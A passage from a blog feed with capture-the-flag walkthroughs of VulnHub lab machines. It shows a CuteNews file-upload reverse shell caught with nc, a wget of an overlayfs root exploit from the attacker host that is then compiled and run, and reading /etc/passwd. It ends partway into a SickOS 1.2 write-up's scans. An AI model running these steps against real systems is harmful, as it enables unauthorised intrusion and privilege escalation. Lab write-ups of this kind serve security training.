<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/simpleCTF# nmap -v -sV -A -O 10.1.1.134 -oN 134_nmap.txt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>80/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-favicon: Unknown favicon MD5: 759585A56089DB516D1FBBBE5A8EEA57
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Please Login / CuteNews
</span><span class='line'>MAC Address: 00:0C:29:29:7A:4E <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Only port <code>80</code> is found and <code>Apache 2.4.7</code> is the HTTP server, also find that, from the title, the CMS is <code>CuteNews</code>.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities in terms of port 80 found by port-scanning stage.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.134
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.6
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Cookie CUTENEWS_SESSION created without the httponly flag
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0x47e 0x4ec3e1d077c80
</span><span class='line'>+ IZUYPEIH Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false </span>positives.
</span><span class='line'>+ OSVDB-3268: GET /docs/: Directory indexing found.
</span><span class='line'>+ OSVDB-3092: GET /LICENSE.txt: License file found may identify site software.
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span></code></pre></td></tr></table></div></figure></p>

<p>Nothing special, so next I open firefox to check the WEB application.</p>

<p><img class="left" src="/downloads/simpleCTF/1.png"></p>

<p>I found a login page, also the WEB application is <code>CuteNews 2.0.3</code>.</p>

<p>By checking online, <code>CuteNews 2.0.3</code> has an known <a href="https://www.exploit-db.com/exploits/37474/" title="CuteNews 2.0.3 - Arbitrary File Upload Vulnerability">Remote File Upload Vulnerability</a>.</p>

<p>So I sign up a new user <code>f4l13n</code> and log in to <strong>Personal Option</strong>, then upload <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">PHP reverse shell</a> <code>rsh443.php</code> as Avatar picture, here I use <strong>burp proxy</strong> to check the request.</p>

<p><img class="left" src="/downloads/simpleCTF/2.png"></p>

<p>After the webshell uploaded successfully, I setup <code>nc</code> to listen on port <code>443</code> and wait for the reverse shell connect back.</p>

<p>Then go to <code>http://10.1.1.134/uploads/</code>, here I can find the uploaded PHP shell, by accessing this PHP file to trigger the shell.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvnp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.134<span class="o">]</span> 48114
</span><span class='line'>Linux simple 3.16.0-30-generic <span class="c">#40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux</span>
</span><span class='line'> 05:35:36 up  1:57,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>uname -a
</span><span class='line'>Linux simple 3.16.0-30-generic <span class="c">#40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux</span>
</span><span class='line'><span class="nv">$ </span>cat /etc/passwd
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&quot;</span>&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/a&gt;
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:
</span><span class='line'>syslog:x:101:104::/home/syslog:/bin/false
</span><span class='line'>mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>messagebus:x:103:107::/var/run/dbus:/bin/false
</span><span class='line'>landscape:x:104:110::/var/lib/landscape:/bin/false
</span><span class='line'>bull:x:1000:1000:bull,,,:/home/bull:/bin/bash
</span></code></pre></td></tr></table></div></figure></p>

<p>Then after lots of enumeration, I found the overlayfs local root vulnerability can let me root in.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@simple:/tmp<span class="nv">$ </span>wget &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.130/privesc/37292.c&quot;</span>&gt;http://10.1.1.130/privesc/37292.c&lt;/a&gt; -O /tmp/37292.c
</span><span class='line'>wget &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.130/privesc/37292.c&quot;</span>&gt;http://10.1.1.130/privesc/37292.c&lt;/a&gt; -O /tmp/37292.c
</span><span class='line'><span class="p">&amp;</span>ndash<span class="p">;</span>2016-06-07 06:06:10<span class="p">&amp;</span>ndash<span class="p">;</span>  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.130/privesc/37292.c&quot;</span>&gt;http://10.1.1.130/privesc/37292.c&lt;/a&gt;
</span><span class='line'>Connecting to 10.1.1.130:80<span class="p">&amp;</span>hellip<span class="p">;</span> connected.
</span><span class='line'>HTTP request sent, awaiting response<span class="p">&amp;</span>hellip<span class="p">;</span> <span class="m">200</span> OK
</span><span class='line'>Length: <span class="m">5123</span> <span class="o">(</span>5.0K<span class="o">)</span> <span class="o">[</span>text/x-csrc<span class="o">]</span>
</span><span class='line'>Saving to: <span class="p">&amp;</span>lsquo<span class="p">;</span>/tmp/37292.c<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;100%<span class="o">[======================================</span>&gt;<span class="o">]</span> 5,123       <span class="p">&amp;</span>ndash<span class="p">;</span>.-K/s   in 0s&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;2016-06-07 06:06:10 <span class="o">(</span>18.0 MB/s<span class="o">)</span> - <span class="p">&amp;</span>lsquo<span class="p">;</span>/tmp/37292.c<span class="p">&amp;</span>rsquo<span class="p">;</span> saved <span class="o">[</span>5123/5123<span class="o">]</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;www-data@simple:/tmp<span class="nv">$ </span>gcc 37292.c -o 37292
</span><span class='line'>gcc 37292.c -o 37292
</span><span class='line'>www-data@simple:/tmp<span class="nv">$ </span>ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 200
</span><span class='line'>drwxrwxrwt  <span class="m">2</span> root     root       <span class="m">4096</span> Jun  <span class="m">7</span> 06:06 .
</span><span class='line'>drwxr-xr-x <span class="m">21</span> root     root       <span class="m">4096</span> Sep  <span class="m">9</span>  <span class="m">2015</span> ..
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> www-data www-data  <span class="m">12502</span> Jun  <span class="m">7</span> 06:00 37088
</span><span class='line'>-rw-rw-rw-  <span class="m">1</span> www-data www-data   <span class="m">6276</span> Sep  <span class="m">2</span>  <span class="m">2015</span> 37088.c
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> www-data www-data  <span class="m">12189</span> Jun  <span class="m">7</span> 06:06 37292
</span><span class='line'>-rw-rw-rw-  <span class="m">1</span> www-data www-data   <span class="m">5123</span> Jun  <span class="m">7</span> 06:04 37292.c
</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> www-data www-data  <span class="m">25304</span> Aug <span class="m">19</span>  <span class="m">2015</span> lpc.py
</span><span class='line'>-rw-rw-rw-  <span class="m">1</span> www-data www-data <span class="m">119499</span> Jun  <span class="m">7</span> 05:48 lpc_rst.txt
</span><span class='line'>www-data@simple:/tmp<span class="nv">$ </span>./37292
</span><span class='line'>./37292
</span><span class='line'>spawning threads
</span><span class='line'>mount <span class="c">#1</span>
</span><span class='line'>mount <span class="c">#2</span>
</span><span class='line'>child threads <span class="k">done</span>
</span><span class='line'>/etc/ld.so.preload created
</span><span class='line'>creating shared library&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;id&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;pwd&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;pwd
</span><span class='line'>/tmp&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;cd /root&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cd /root&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;ls&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ls
</span><span class='line'>flag.txt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;cat flag.txt&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cat flag.txt
</span><span class='line'>U wyn teh Interwebs!!1eleven11!!1!
</span><span class='line'>Hack the planet!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Done~</p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] SickOS 1.2]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/06/05/vulnhub-sickos-1-dot-2/"/>
    <updated>2016-06-05T17:03:17+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/06/05/vulnhub-sickos-1-dot-2</id>
    <content type="html"><![CDATA[<p>&ldquo;This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/d4rk,199/">D4rk</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/sickos-12,144/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>

<p>Target: SickOS: 1.2 (<em>10.1.1.133/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>File upload via HTTP PUT method</li>
<li>python reverse shell</li>
<li>chkrootkit 0.49 Local Root Exploit</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Use dirb tool to discover hidden directory [<font color="FF8000">dirb</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Exploit HTTP PUT Method to upload one-line PHP shell</li>
<li>Use python reverse shell to get a better shell</li>
<li>Enumeration &amp;&amp; Exploit <code>chkrootkit 0.49</code> to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://www.metasploit.com/">Metasploit</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://dirb.sourceforge.net/about.html">dirb</a></li>
<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell cheat sheet</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address (10.1.1.133 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.133  00:0c:29:0f:eb:df   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:f0:91:47   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.290 seconds <span class="o">(</span>111.79 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.133</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.133/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-06-05 04:39:01 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.133                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.133        &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>There are 2 ports (22, 80) detected by <code>masscan</code>, then I run <code>nmap</code> to do a deeper service scan.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Nmap 7.12 scan initiated Sun Jun  <span class="m">5</span> 14:40:00 <span class="m">2016</span> as: nmap -sV -A -O -v -oN 133_nmap.txt 10.1.1.133&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Nmap scan report <span class="k">for</span> 10.1.1.133
</span><span class='line'>Host is up <span class="o">(</span>0.00034s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">998</span> filtered ports
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 <span class="o">(</span>DSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;  <span class="m">256</span> a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>80/tcp open  http    lighttpd 1.4.28
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: lighttpd/1.4.28
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Site doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'>MAC Address: 00:0C:29:0F:EB:DF <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> turncate <span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Run <code>nikto</code> to scan WEB application, but nothing found.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.133
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
</span></code></pre></td></tr></table></div></figure></p>

<p>Then run <code>dirb</code> to discover potential hidden directories and one folder was found: <code>/test/</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/sickos1.2# dirb &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/&quot;</span>&gt;http://10.1.1.133/&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;DIRB v2.22&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;By The Dark Raver&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;START_TIME: Sun Jun  <span class="m">5</span> 14:46:31 2016
</span><span class='line'>URL_BASE: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/&quot;</span>&gt;http://10.1.1.133/&lt;/a&gt;
</span><span class='line'>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;GENERATED WORDS: 4612&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>mdash<span class="p">;</span>- Scanning URL: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/&quot;</span>&gt;http://10.1.1.133/&lt;/a&gt; <span class="p">&amp;</span>mdash<span class="p">;</span>-
</span><span class='line'>+ &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/index.php&quot;</span>&gt;http://10.1.1.133/index.php&lt;/a&gt; <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:163<span class="o">)</span>                                                                                                                                                         &lt;br/&gt;
</span><span class='line'><span class="o">==</span>&gt; DIRECTORY: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/test/&quot;</span>&gt;http://10.1.1.133/test/&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">&amp;</span>mdash<span class="p">;</span>- Entering directory: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.133/test/&quot;</span>&gt;http://10.1.1.133/test/&lt;/a&gt; <span class="p">&amp;</span>mdash<span class="p">;</span>-
</span><span class='line'><span class="o">(</span>!<span class="o">)</span> WARNING: Directory IS LISTABLE. No need to scan it.                      &lt;br/&gt;
